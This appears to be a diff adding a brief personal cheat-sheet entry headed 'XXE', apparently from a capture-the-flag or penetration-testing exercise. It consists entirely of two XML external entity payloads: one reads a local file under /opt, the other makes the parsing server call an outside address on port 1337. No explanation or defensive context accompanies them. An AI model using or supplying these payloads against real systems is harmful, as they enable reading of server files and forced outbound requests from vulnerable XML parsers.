@@ -1,0 +1,14 @@
+##### XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt" >]>
+
+<name>&xxe;</name>
+
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://192.168.135.247:1337/" >]>
+<upload><file>&xxe;</file></upload>
+
+
